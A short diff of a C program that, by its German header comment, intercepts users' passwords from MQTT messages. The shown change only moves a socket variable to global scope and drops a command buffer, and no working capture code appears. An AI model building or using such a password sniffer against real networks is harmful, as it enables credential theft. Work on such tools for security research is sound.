@@ -13,8 +13,8 @@ Programm zum abfangen von dem Passwort eines Benutzers bei MQTT Nachrichten an e
 #include <arpa/inet.h>
 //#include <gpgme.h>
 
+int sock;
 char buffer[65536];
-char command[2000];
 char user[65536];
 char pass[65536];
 
@@ -59,8 +59,6 @@ int main(int argc, char **argv){
 
 	struct sigaction sigIntHandler;
 	
-	     
-   	int sock;
 	int bindret;
 	
 	socklen_t saddr_size;
